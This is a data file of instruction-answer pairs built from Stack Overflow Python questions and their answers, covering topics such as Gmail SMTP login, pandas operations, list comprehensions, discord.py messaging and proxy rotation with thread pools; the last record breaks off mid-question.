{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Error while using python's email automation<p>I have correctly configured the app password for Gmail which i use for &quot;password&quot;. I'm having two-step enabled.\nI'm using python 3.8<\/p>\n<pre><code>import smtplib\nimport ssl\n\nemail = &quot;send@gmail.com&quot; #changed\npassword = &quot;aeaeaeaeaeaea&quot; #changed\nto = &quot;rece@gmail.com&quot;\nmsg = &quot;Hello, Python here.&quot;\n\nserver = smtplib.SMTP_SSL(&quot;smtp.gmail.com&quot;, 465, ssl.create_default_context())\n\nserver.login(email, password)\n\nserver.sendmail(email , to , msg)\n\nserver.quit()\n\n<\/code><\/pre>\n<p>The error I face is<\/p>\n<pre><code>\nC:\\Users\\Owner\\Desktop\\cd&gt;python auto_email.py\nTraceback (most recent call last):\n  File &quot;auto_email.py&quot;, line 11, in &lt;module&gt;\n    server.login(email, password)\n  File &quot;C:\\Users\\Owner\\AppData\\Local\\Programs\\Python\\Python38\\lib\\smtplib.py&quot;, line 698, in login\n    self.ehlo_or_helo_if_needed()\n  File &quot;C:\\Users\\Owner\\AppData\\Local\\Programs\\Python\\Python38\\lib\\smtplib.py&quot;, line 605, in ehlo_or_helo_if_needed\n    (code, resp) = self.helo()\n  File &quot;C:\\Users\\Owner\\AppData\\Local\\Programs\\Python\\Python38\\lib\\smtplib.py&quot;, line 434, in helo\n    (code, msg) = self.getreply()\n  File &quot;C:\\Users\\Owner\\AppData\\Local\\Programs\\Python\\Python38\\lib\\smtplib.py&quot;, line 398, in getreply\n    raise SMTPServerDisconnected(&quot;Connection unexpectedly closed&quot;)\nsmtplib.SMTPServerDisconnected: Connection unexpectedly closed\n\nC:\\Users\\Owner\\Desktop\\cd&gt;\n\n<\/code><\/pre>\n<p>How to overcome this issue? My internet connection is also having a decent speed.<\/p>","output_text":"<p>This might be an issue with security enhancements Google introduced some years ago. If your GMail account has two-factor authentication enabled (generally a good idea), please try creating an app-specific password and use that in your code. An alternative you might try without two-factor authentication would be to allow &quot;less secure apps&quot;. You can find details in the Google documentation here: <a href=\"https:\/\/support.google.com\/accounts\/answer\/6010255?hl=en\" rel=\"nofollow noreferrer\">https:\/\/support.google.com\/accounts\/answer\/6010255?hl=en<\/a><\/p>\n<p>UPDATE: Try the following:<\/p>\n<pre><code>import smtplib\nimport ssl\n\nemail = &quot;xxx@gmail.com&quot; #changed\npassword = &quot;rjyofpcoxcdtycip&quot; #changed\nto = &quot;yyy@gmail.com&quot;\nmsg = &quot;Hello, Python here.&quot;\n\nserver = smtplib.SMTP(&quot;smtp.gmail.com&quot;, 587)\n\nserver.starttls()\n\nserver.login(email, password)\n\nserver.sendmail(email , to , msg)\n\nserver.quit()\n<\/code><\/pre>\n<p>It uses STARTTLS for an explicit TLS connection. I successfully tested this using my GMail account with an app password.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n namespace with submodule imports<p>I am wanting to use a simple list comprehension to set <code>__all__<\/code> for the modules in my package. I am noticing that when I import something from one of my own modules that the module name is added to the namespace, not just what I am importing. This is not the same when as when importing builtin or third-party packages.<\/p>\n<pre><code>- foo\n  - __init__.py\n  - bar.py\n  - baz.py\n<\/code><\/pre>\n<p><code>__init__.py<\/code><\/p>\n<pre><code>import os as _os\n\nfrom numpy.random import randint as _randint\n\nimport foo.bar as _bar\n\nfrom foo.baz import foobar\n\n__all__ = [x for x in globals() if not x.startswith('_')]\n<\/code><\/pre>\n<p>I expect:<\/p>\n<pre><code>&gt;&gt;&gt; import foo\n&gt;&gt;&gt; foo.__all__\n['foobar']\n<\/code><\/pre>\n<p>But I get:<\/p>\n<pre><code>&gt;&gt;&gt; import foo\n&gt;&gt;&gt; foo.__all__\n['bar', 'baz', 'foobar']\n<\/code><\/pre>\n<p>I know I could expand my list comprehension for <code>__all__<\/code> to filter out <code>ModuleType<\/code> but I am wondering why the behavior is different for my own modules. I would really like to be able to use a leading underscore to handle this as I can with other packages. I have also tried using <code>dir()<\/code>, <code>locals()<\/code>, and <code>vars()<\/code> instead of <code>globals()<\/code> but the result is the same.<\/p>\n<p><strong>Update<\/strong><br \/>\nOut of curiosity, I also imported <code>foobar<\/code> into <code>bar.py<\/code> and printed <code>globals()<\/code> and <code>'bar'<\/code> was not included. So, it appears my modules are only added to the namespace within <code>__init__.py<\/code> files?<\/p>","output_text":"<p>All credits to @MisterMiyagi in comments.<\/p>\n<p>I will only confirm this with a quote from the official documentation <a href=\"https:\/\/docs.python.org\/3\/reference\/import.html#submodules\" rel=\"nofollow noreferrer\">5.4.2. Submodules<\/a>:<\/p>\n<blockquote>\n<p>When a submodule is loaded using any mechanism [...] <strong>a binding is placed in the parent module\u2019s namespace to the submodule object<\/strong>.<\/p>\n<\/blockquote>\n<p>For example in your case, if package <code>foo<\/code> has a submodule <code>bar<\/code>, after importing <code>foo.bar<\/code>, <code>foo<\/code> will have an attribute <code>bar<\/code> which is bound to the submodule <code>foo.bar<\/code>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do I SUM a column in a list?<p>I'm trying to import a CSV file as a list in Python.  I then want to take one of the columns and sum it to find a total for that particular column.<\/p>\n\n<p>The code I'm using (including parts I have commented out) is written below. I've also included the image of the CSV file I'm working with.<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/h5vCT.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/h5vCT.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>Code:<\/p>\n\n<pre><code>import csv\n\n    f = open('cars.csv', 'r')\n\n    reader = csv.reader(f)\n\n    cars = []\n\n    for row in reader:\n        try:\n\n            cars.append([int(row[2])])\n        except:\n            pass\n\n    total = sum(cars)\n\n    print(total)\n<\/code><\/pre>","output_text":"<p>From the <a href=\"https:\/\/docs.python.org\/3\/library\/csv.html\" rel=\"nofollow noreferrer\">documentation<\/a>:<\/p>\n\n<p>\"Each row read from the csv file is returned as a list of strings\"<\/p>\n\n<p>So your code should be:<\/p>\n\n<pre><code>sum = 0\nwith open(\"cars.csv\") as f:\n    for row in csv.reader(f):\n        sum += int(row[2])\nreturn sum\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Remove pandas data between two points<p>I have a dataframe of tank level, which can be quite noisy.<\/p>\n<p>I have written an algorithm to (accurately &amp; consistently!) detect peaks and troughs and I now need to remove data on one (filling) part of the cycle, between the grey points and orange points in the image below:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/afaUe.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/afaUe.png\" alt=\"Snapshot from Excel\" \/><\/a><\/p>\n<p>Thanks to @piterbarg and @richardec, I can recognize the next peak following a trough but now I am stuck on how to remove the data between the two (including the High Peak) (colored red below) to only perform further calculations when the level is dropping:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/xj1Ra.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/xj1Ra.png\" alt=\"Extract from Excel copy of dataframe\" \/><\/a><\/p>\n<p>A csv copy of the dataframe is on <a href=\"https:\/\/github.com\/ChemEnger\/pandas\/blob\/64a16eb9795ff3433929808c03ba51f743fb423b\/df_TankLevel.csv\" rel=\"nofollow noreferrer\">GitHub<\/a>.  The full data set is &gt; 2M rows, so row-wise calculations are out of the question!<\/p>\n<p>I am completely stuck just now so any help is gratefully received!<\/p>","output_text":"<p>Solved, and much more simply than I was originally thinking:<\/p>\n<pre><code>##Add an empty 'NewCol'\ndf['NewCol'] = None\n##Add the word 'High' where a High Peak is seen\ndf.loc[df['High Peak'].notna(), 'NewCol'] = 'High'\n##Add the word 'Low' where a Low Peak is seen\ndf.loc[df['Low Peak'].notna(), 'NewCol'] = 'Low'\n##Back fill the word 'High' &amp; 'Low'\ndf['NewCol'].bfill(inplace=True)\n##Remove rows with 'High'\ndf = df[df['NewCol'] != 'High']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Can you use a List Comprehension when not appending the iterable<p>So I decided to start using List Comprehensions and after a little bit of googling I managed to do this:<\/p>\n<pre><code># old way\nloaded_sounds = []\nfor i in assetList_text:\n    if i.startswith(&quot;loaded_sound&quot;):\n        loaded_sounds.append(i.split(',')[1])\n\n# new way\nloaded_sounds = [i.split(',')[1] for i in assetList_text if i.startswith(&quot;loaded_sound&quot;)]\n<\/code><\/pre>\n<p>Which works perfectly.\nSo I thought id continue on to the hard for loops and this is where the list comprehension result isn't matching the for loop result.<\/p>\n<p>So this conversion is a little harder as it not only has 2 'if' statment's but its not actually appending the index either.<\/p>\n<pre><code>gsc_files = []\nfor i in assetList_text:\n    if &quot;.gsc&quot; in i:\n        d = i.split(',')[-1].replace(&quot;\\n&quot;, &quot;&quot;)\n        if d not in gsc_files:\n            gsc_files.append(d)\n<\/code><\/pre>\n<p>So this prints out: 6\nBut with this:<\/p>\n<pre><code>gsc_files = [i.split(',')[-1].replace(&quot;\\n&quot;, &quot;&quot;) for i in assetList_text if &quot;.gsc&quot; in i if i.split(',')[-1].replace(&quot;\\n&quot;, &quot;&quot;) not in gsc_files]\n<\/code><\/pre>\n<p>It prints out: 0\nSo I don't know where its going wrong?<\/p>\n<p>Also whilst on the topic of List Comprehensions id like to know their vastness.\nCould the following 2 for loops be converted to list comprehensions?<\/p>\n<p>[1]<\/p>\n<pre><code>weapon_files = []\nx = join(f&quot;{WAW_ROOT_DIR}\/raw\/weapons\/sp&quot;)\nfor path, subdirs, files in walk(x):\n    for fileName in files:\n    content = join(x, fileName)\n    if content not in weapon_files:\n        weapon_files.append(f&quot;{WAW_ROOT_DIR}\/raw\/weapons\/sp\/{fileName}&quot;)\n\n<\/code><\/pre>\n<p>[2]<\/p>\n<pre><code>gsc_files_dir = []\nfor path in gsc_files:\nif f&quot;{CURRENT_SELECTED_MOD.lower()}&quot; in path:\n    dir = join(f&quot;{WAW_ROOT_DIR}\/mods\/{CURRENT_SELECTED_MOD}\/{path}&quot;)\n    gsc_files_dir.append(dir)\nelif os.path.exists(f&quot;{WAW_ROOT_DIR}\/mods\/{CURRENT_SELECTED_MOD}\/{path}&quot;):\n    dir = join(f&quot;{WAW_ROOT_DIR}\/mods\/{CURRENT_SELECTED_MOD}\/{path}&quot;)\n    gsc_files_dir.append(dir)\nelse:\n    dir = join(f&quot;{WAW_ROOT_DIR}\/raw\/{path}&quot;)\n    gsc_files_dir.append(dir)\n\n<\/code><\/pre>\n<p>Regards,\nPhil<\/p>\n<p>EDIT: in response to &quot;DialFrost's&quot; question:<\/p>\n<pre><code>f1 = join(f&quot;{WAW_ROOT_DIR}\/zone_source\/english\/assetlist\/{CURRENT_SELECTED_MOD}.csv&quot;)\nf2 = join(f&quot;{WAW_ROOT_DIR}\/zone_source\/english\/assetlist\/{CURRENT_SELECTED_MOD}_patch.csv&quot;)\nf3 = join(f&quot;{WAW_ROOT_DIR}\/zone_source\/english\/assetinfo\/{CURRENT_SELECTED_MOD}.csv&quot;)\nf4 = join(f&quot;{WAW_ROOT_DIR}\/zone_source\/english\/assetinfo\/{CURRENT_SELECTED_MOD}_patch.csv&quot;)\n\nwith open(f1, 'r') as assetList, open(f2, 'r') as assetListPatch, open(f3, 'r') as assetInfo, open(f4, 'r') as assetInfoPatch:\n    assetList_text = assetList.readlines()\n    assetListPatch_text = assetListPatch.readlines()\n    assetInfo_text = assetInfo.readlines()\n    assetInfoPatch_text = assetInfoPatch.readlines()\n\n<\/code><\/pre>\n<p>assetList_text is a large(3k+ lines) file.\nSo here's some info from assetList_text including the &quot;.gsc&quot; lines:<\/p>\n<pre><code>fx,weapon\/shellejects\/fx_smk_weapon_shell_eject\nfx,weapon\/shellejects\/fx_smk_weapon_shell_emit\nfx,weapon\/shellejects\/shotgun\nfx,weapon\/shellejects\/shotgun_resting\nfx,weapon\/shellejects\/shotgun_view\nfx,weapon\/shellejects\/shotgun_view_blurred01\nmptype,nazi_zombie_heroes\ncharacter,char_zomb_player_0\ncharacter,char_zomb_player_1\ncharacter,char_zomb_player_2\ncharacter,char_zomb_player_3\nrawfile,animtrees\/zombie_factory.atr\nrawfile,clientscripts\/_zombie_mode.csc\nrawfile,clientscripts\/createfx\/dlc3_fx.csc\nrawfile,clientscripts\/createfx\/free_city_fx.csc\nrawfile,clientscripts\/dlc3_code.csc\nrawfile,clientscripts\/dlc3_teleporter.csc\nrawfile,clientscripts\/free_city.csc\nrawfile,clientscripts\/free_city_amb.csc\nrawfile,maps\/createart\/free_city_art.gsc\nrawfile,maps\/createfx\/dlc3_fx.gsc\nrawfile,maps\/createfx\/free_city_fx.gsc\nrawfile,maps\/dlc3_code.gsc\nrawfile,maps\/dlc3_teleporter.gsc\nrawfile,maps\/free_city.gsc\nrawfile,rumble\/flamethrower\nrawfile,rumble\/flamethrower_h.rmb\nrawfile,rumble\/flamethrower_l.rmb\nrawfile,vision\/zombie_factory.vision\n<\/code><\/pre>","output_text":"<p>Try replace two if statements to one, and add 'and' operator instead of second 'if'. Because I'm not sure what 2 'if' works fine in list-comprehension.\nSo, change this:<\/p>\n<pre><code>gsc_files = [i.split(',')[-1].replace(&quot;\\n&quot;, &quot;&quot;) for i in assetList_text if &quot;.gsc&quot; in i if i.split(',')[-1].replace(&quot;\\n&quot;, &quot;&quot;) not in gsc_files]\n<\/code><\/pre>\n<p>To this:<\/p>\n<pre><code>gsc_files = [i.split(',')[-1].replace(&quot;\\n&quot;, &quot;&quot;) for i in assetList_text if (&quot;.gsc&quot; in i) and (i.split(',')[-1].replace(&quot;\\n&quot;, &quot;&quot;) not in gsc_files)]\n<\/code><\/pre>\n<p>'add' operator should compare correct two statements<\/p>\n<p>And I'm not sure what try convert all for loops or just large parts of code in list-comprehension it is good idea, because this can make your code hard to read<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Removing list of strings from column in pandas<p>I would need to remove a list of strings:<\/p>\n<pre><code>list_strings=['describe','include','any']\n<\/code><\/pre>\n<p>from a column in pandas:<\/p>\n<pre><code>My_Column\n\ninclude details about your goal\ndescribe expected and actual results\nshow some code anywhere\n<\/code><\/pre>\n<p>I tried<\/p>\n<pre><code>df['My_Column']=df['My_Column'].str.replace('|'.join(list_strings), '')\n<\/code><\/pre>\n<p>but it removes parts of words.<\/p>\n<p>For example:<\/p>\n<pre><code>My_Column\n\ndetails about your goal\nexpected and actual results\nshow some code where # here it should be anywhere\n<\/code><\/pre>\n<p>My expected output:<\/p>\n<pre><code>My_Column\n\ndetails about your goal\nexpected and actual results\nshow some code anywhere \n<\/code><\/pre>","output_text":"<p>Use the &quot;word boundary&quot; expression <code>\\b<\/code> like.<\/p>\n<pre><code>In [46]: df.My_Column.str.replace(r'\\b{}\\b'.format('|'.join(list_strings)), '')\nOut[46]: \n0         details about your goal\n1     expected and actual results\n2         show some code anywhere\nName: My_Column, dtype: object\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n extract all keys of a dictionary of dictionaries as a list or np.array<p><strong>Input<\/strong>: a dictionary of dictionaries where all keys are integers. Values in the nested dictionaries are irrelevant.<\/p>\n<p><strong>Desired output<\/strong>: a list or a <code>np.array<\/code> of the <code>(outer_key, inner_key)<\/code> pairs.<\/p>\n<p>Example:<\/p>\n<pre><code>dict_of_dicts = {0: {1: &quot;crap&quot;, 2: &quot;crap&quot;, 3: &quot;crap&quot;}, 4: {5: &quot;crap&quot;, 1: &quot;crap&quot;}}\n<\/code><\/pre>\n<p>I need an output such as<\/p>\n<pre><code>key_pairs = [(0,1), (0,2), (0,3), (4,5), (4,1)]\n<\/code><\/pre>\n<p>or<\/p>\n<pre><code>import numpy as np \nkey_pairs = np.array([[0,1], [0,2], [0,3], [4,5], [4,1]])\n<\/code><\/pre>\n<p>The order of the pairs is not important, obviously (<code>dict_of_dicts<\/code> is not ordered, after all), so<\/p>\n<pre><code>key_pairs = np.array([[0,2], [0,1], [0,3], [4,5], [4,1]])\n<\/code><\/pre>\n<p>would still work, for example. Concerning speed, on one hand this will have to be executed a few hundred thousands of times, but on the other all dicts of dicts are fairly small (about a dozen of key pairs). Thus, readability would matter more than speed, I guess. Having both would be excellent, of course <\/p>","output_text":"<p>You could use a nested list comprehension:<\/p>\n<pre><code>key_pairs = [(k1, k2) for k1, v in dict_of_dicts.items() for k2 in v.keys()]\nprint(key_pairs)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>[(0, 1), (0, 2), (0, 3), (4, 5), (4, 1)]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to simply send a message using discord.py<p>Okay i have a very simple question but i couldnt find out how to solve it by any chance.\nI have a script that fetches some numbers out of the steam website, then compares them. i want to use discord.py to send me that results on discord. i already have the bot on discord, but i coulndt figure out how to just send a message and not react to a message sent by a user or anything. This is my code:<\/p>\n<pre><code>Float = float(Float[8:])\nif Float &lt;= 0.01:\n    element2 = driver.find_element_by_xpath('\/html\/body\/div[1]\/div[7]\/div[2]\/div[2]\/div[4]\/div[1]\/div[3]\/div[4]\/div[4]\/div[2]\/div[2]\/div[2]\/span\/span[1]')\n    Price = element2.text\n    print(&quot;Snipe found: \\n&quot;\n          &quot;Mag-7 Carbon Fiber Factory New with Float:\\n&quot;\n          , Float, '\\n', Price)\n<\/code><\/pre>\n<p>i also have some selenium in it, but that is not a problem. the variable &quot;Float&quot; is also defined before. i simply want to send the stuff that is in the <code>print<\/code> function as a message to a discord server.<br \/>\nis this possible by any chance?<br \/>\nThanks for the help<\/p>","output_text":"<p>Just make it a command and use <code>ctx.send()<\/code>. Since you don't know how to send a message on discord.py, I'm assuming that you are very new to it.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import ...\nfrom discord.ext import commands\nimport discord\n\nbot = commands.Bot(command_prefix='!')\n\n@bot.command()\nasync def steamfetch(ctx):\n    Float = float(Float[8:])\n    if Float &lt;= 0.01:\n        element2 = driver.find_element_by_xpath('\/html\/body\/div[1]\/div[7]\/div[2]\/div[2]\/div[4]\/div[1]\/div[3]\/div[4]\/div[4]\/div[2]\/div[2]\/div[2]\/span\/span[1]')\n        Price = element2.text\n        await ctx.send(f&quot;Snipe found:\\nMag-7 Carbon Fiber Factory New with Float:\\n{Float}\\n{Price}')\n<\/code><\/pre>\n<p>You should really look at the <a href=\"https:\/\/discordpy.readthedocs.io\/en\/latest\/api.html\" rel=\"nofollow noreferrer\">discord.py docs<\/a> or other discord.py tutorials for this because sending a message are in <strong>MANY<\/strong> of the discord.py tutorials. I don't know if you did but please try doing your own research before asking a question here.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to scrape websites with threads - 1 IP per thread?<p>I have 60 proxies (residential, with username and password). I want to scrape 10000 webpages. I want to rotate over the IPs, so that 1 IP per thread is used every 1 second. So every second there are 60 threads, each thread scraping 1 page.<\/p>\n<p>But I just can't do it.<\/p>\n<p>The best I was able to do is the below program. It does 1 IP per thread, but only for 60 pages. I want it to continue until all 10000 pages are scraped.<\/p>\n<p>How can I do that? Would asyncio be a better choice?<\/p>\n<pre><code>import threading\nimport requests\nimport time\nimport lxml.html\nimport csv\nfrom concurrent.futures import ThreadPoolExecutor\n\n\ndef scrape_page(html, url):\n    SCRAPE STUFF FROM URL\n    return LIST\n\n\ndef download(url, proxy):\n    try:\n        proxy = {&quot;https&quot;: proxy, &quot;http&quot;: proxy}\n        r = requests.get(url, proxies=proxy, stream=True)\n        r.raw_decode_content = True\n        time.sleep(1)\n    except Exception as err:\n        print(url, &quot;503&quot;)\n\n    return scrape_page(r.text, url)\n\n\nwebsites = LIST WITH 10000 SITES\nROTATING_PROXY_LIST = LIST WITH 60 PROXIES\n\nwith ThreadPoolExecutor(max_workers=60) as executor:   \n    data = []\n\n    for result in executor.map(download, websites, ROTATING_PROXY_LIST):\n        data.append(result)\n\nwith open(&quot;results.csv&quot;, &quot;w&quot;, newline=&quot;\\n&quot;, encoding=&quot;utf8&quot;) as f:\n    writer = csv.writer(f, delimiter=&quot;\\t&quot;)\n    writer.writerows(data)\n<\/code><\/pre>","output_text":"<p>The problem is that when you write this:<\/p>\n<pre><code>executor.map(download, websites, ROTATING_PROXY_LIST)\n<\/code><\/pre>\n<p>You're effectively asking for <code>zip(websites, ROTATING_PROXY_LIST)<\/code>, which will only ever be as long as the <em>shorttest<\/em> iterable. You can solve this by making <code>ROTATING_PROXY_LIST<\/code> effectively infinite:<\/p>\n<pre><code>import itertools\n.\n.\n.\nwith ThreadPoolExecutor(max_workers=60) as executor:   \n    data = []\n\n    for result in executor.map(download, websites, itertools.cycle(ROTATING_PROXY_LIST)):\n        data.append(result)\n<\/code><\/pre>\n<p><code>itertools.cycle<\/code> will &quot;Return elements from the iterable until it is exhausted. Then repeat the sequence indefinitely.&quot;<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Using a Pandas Rolling window to find the maximum whilst keeping the entire row<p>I have a dataframe that looks like this<\/p>\n\n<pre><code>timestamp                  group   score\n2020-06-03 09:01:27+00:00  A       13\n2020-06-03 09:05:18+00:00  B       14\n                           C       15\n2020-06-03 09:05:39+00:00  A       12\n2020-06-03 09:05:45+00:00  B       16\n2020-06-03 09:07:09+00:00  C       17\n2020-06-03 09:08:43+00:00  A       26\n<\/code><\/pre>\n\n<p>I would like to take a rolling window of size three and find the maximum score.\nThe part I'm struggling with is how to keep the <code>timestamp<\/code> and  <code>group<\/code> information.\nThe expected output would be:<\/p>\n\n<pre><code>timestamp                  group   score\n2020-06-03 09:05:18+00:00  C       15\n                           C       15\n2020-06-03 09:05:45+00:00  B       16\n2020-06-03 09:07:09+00:00  C       17\n2020-06-03 09:08:43+00:00  A       26\n<\/code><\/pre>\n\n<p>So importantly, the first row in the output is duplicated. Thanks!<\/p>","output_text":"<p>Idea is get indices for maximal values of <code>score<\/code> by <a href=\"https:\/\/stackoverflow.com\/a\/40102656\">this<\/a> solution and then pass to <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.loc.html\" rel=\"nofollow noreferrer\"><code>DataFrame.loc<\/code><\/a>:<\/p>\n\n<pre><code>N = 3\ns = df['score']\nmaxidx = (s.values[np.arange(s.size-N+1)[:,None] + np.arange(N)]).argmax(1)\ndf = df.loc[s.index[maxidx+np.arange(maxidx.size)]]\nprint (df)\n                                 score\ntimestamp                 group       \n2020-06-03 09:05:18+00:00 C         15\n                          C         15\n2020-06-03 09:05:45+00:00 B         16\n2020-06-03 09:07:09+00:00 C         17\n2020-06-03 09:08:43+00:00 A         26\n<\/code><\/pre>\n\n<p>Or:<\/p>\n\n<pre><code>N = 3   \ns = df['score']\n#https:\/\/stackoverflow.com\/a\/40101614\nidx = s.index[s.rolling(N).apply(np.argmax)[(N-1):].astype(int)+np.arange(len(s)-(N-1))]\ndf = df.loc[idx]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to count and calculate only selected columns in panda dataframe as well as in dask dataframe?<p>I have dataframe where i want to count non zero columns for each row and as well sum of selected rows in dask and pandas?<\/p>\n<pre><code>id     Car               Model             1.1         2.1        3.1        4.1       \n1      BMW               Model1            2           5          2          0\n2      Volvo             V1                0           0          10         3\n3      VW                Polo              5           2          4          5 \n<\/code><\/pre>\n<p>So i need 2 extra columns in output which will give count of non zero values and sum of selected columns<\/p>\n<p>Desired Output would be like this:<\/p>\n<pre><code>id     Car               Model             1.1         2.1        3.1        4.1       Count    Sum\n1      BMW               Model1            2           5          2          0          3       9\n2      Volvo             V1                0           0          10         3          2       13\n3      VW                Polo              5           2          4          5          4       16\n<\/code><\/pre>\n<p>I think i can use <code>df.fillna(0).astype(bool).sum(axis=1)<\/code> but i need to use this on only selected columns as you can see in desired output. Moreover how i can get the similar result in dask?<\/p>","output_text":"<p>What you essentially need to do is loop over each row and apply sum aggregation function. This is what <code>apply<\/code> is made for.<\/p>\n<p>You can simply return a Series with the desired values for each row. <code>sum<\/code> is obvious and <code>count<\/code> is essentially the same idea as you had. <code>s!=0<\/code> returns <code>True<\/code> or <code>False<\/code> and <code>sum()<\/code> only considers <code>True<\/code>.<\/p>\n<pre><code>In [83]: def custom_agg(s): \n    ...:     return pd.Series({'sum': s.sum(), 'count': (s!=0).sum()}) \n<\/code><\/pre>\n<p>Then apply it like this:<\/p>\n<pre><code>In [85]: df[['sum', 'count']] = df[['1.1', '2.1', '3.1', '4.1']].apply(custom_agg, axis=1)                                                                                                                 \n\nIn [86]: df                                                                                                                                                                                                \nOut[86]: \n      Car   Model  1.1  2.1  3.1  4.1  sum  count\nid                                               \n1     BMW  Model1    2    5    2    0    9      3\n2   Volvo      V1    0    0   10    3   13      2\n3      VW    Polo    5    2    4    5   16      4\n<\/code><\/pre>\n<p>Dask implements apply. The code should work in pandas as well as in Dask out of the box.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can i get the common elements in the first two list and save to a new list in python 3?<pre><code>list1 = [input(&quot;Enter the values for the first list: &quot;)]\nlist2 = [input(&quot;Enter the values for the second list: &quot;)]\nprint(list1)\nprint(list2)\nlist3 = []\nfor element in list1:\n    if element in list2:\n        list3 = list2.append(element)\nprint(list3)\n<\/code><\/pre>\n<p>This is what i have tried. but I am getting an empty list as list3!<\/p>","output_text":"<pre><code>list1 = [input(&quot;Enter the values for the first list: &quot;)]\nlist2 = [input(&quot;Enter the values for the second list: &quot;)]\n<\/code><\/pre>\n<p>list1 and list2 will be a list of string. hence you are getting list3 empty. PFB code and o\/p:<\/p>\n<pre><code>list1 = [input(&quot;Enter the values for the first list: &quot;)]\nlist2 = [input(&quot;Enter the values for the second list: &quot;)]\nprint(list1)\nprint(list2)\nlist3 = []\nfor element in list1:\n    print(type(element))\n    if element in list2:\n        list3.append(element)\n\nprint(list3)\n<\/code><\/pre>\n<p>output:<\/p>\n<pre><code>Enter the values for the first list: 1 2 3 4 5\nEnter the values for the second list: 2 3 4 5 6 \n['1 2 3 4 5']\n['2 3 4 5 6']\n&lt;class 'str'&gt;\n[]\n<\/code><\/pre>\n<p>to add the correct way. Please see below eg. for getting list1 and list2:<\/p>\n<pre><code># list1 = [input(&quot;Enter the values for the first list: &quot;)]\n# list2 = [input(&quot;Enter the values for the second list: &quot;)]\nlist1 = [int(item) for item in input(&quot;Enter the 1st list items : &quot;).split()]\nlist2 = [int(item) for item in input(&quot;Enter the 2nd list items : &quot;).split()]\n\nprint('1st list: ',list1)\nprint('2nd list: ',list2)\nlist3 = []\nfor element in list1:\n    if element in list2:\n        list3.append(element)\n\nprint('common: ', list3)\n<\/code><\/pre>\n<p>output:<\/p>\n<pre><code>Enter the 1st list items : 1 2 3 4 5\nEnter the 2nd list items : 3 4 5 6 7\n1st list:  [1, 2, 3, 4, 5]\n2nd list:  [3, 4, 5, 6, 7]\ncommon:  [3, 4, 5]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n a weird duplication about merge values, keys in a dictionary<p>I have stuck on a question for several days, anyone can provide a hint, I appreciate!<\/p>\n<p>Description:<\/p>\n<p>I have a dictionary, but I want to merge <strong>some<\/strong> of its values and keys, for example:<\/p>\n<pre><code>Input:\ninitial_dict = {'aa': ['AA'],'bb':['BB'],'BB':['MM'],'cc':['dd'],'dd':['GG','HH','LL']}\n\nDesired output:\ngoal_dict = {'aa': ['AA'],'bb':['BB','MM'],'cc':['dd','GG','HH','LL']}\n<\/code><\/pre>\n<p>Which means, if a <strong>key\/value<\/strong> has been in its previous keys or values, then attach its <strong>value\/key<\/strong> to the previous value if this <strong>value\/key<\/strong> has not been there yet (maybe not so clear, but see the above input and output).<\/p>\n<p>I have the following code, I think they are perfect, but I got a lot duplication outputs:<\/p>\n<pre><code>dict_head_conj_pair = {'aa': ['AA'],'bb':['BB'],'BB':['MM'],'cc':['dd'],'dd':['GG','HH','LL']}\ndict_head_conj_new = {}\nprint(dict_head_conj_pair)\nfor a_key in dict_head_conj_pair.keys():\n    if dict_head_conj_new:\n        if a_key not in dict_head_conj_new.keys():\n            for idx_value, new_value_list in enumerate(dict_head_conj_new.copy().values()):\n                if a_key in new_value_list:\n                    for idx_key, new_key in enumerate(dict_head_conj_new.copy().keys()):\n                        if idx_key == idx_value:\n                            target_key = new_key\n                            for con_0 in range(len(dict_head_conj_pair[a_key])):\n                                for new_value_list_1 in dict_head_conj_new.copy().values():\n                                    dict_head_conj_new[target_key].append(dict_head_conj_pair[a_key][con_0])\n                else:\n                    for con_1 in range(len(dict_head_conj_pair[a_key])):\n                        if con_1 == 0:\n                            dict_head_conj_new.setdefault(a_key, []).append(dict_head_conj_pair[a_key][con_1])\n                        else:\n                            dict_head_conj_new[a_key].append(dict_head_conj_pair[a_key][con_1])\n    else:\n        for con_2 in range(len(dict_head_conj_pair[a_key])):\n        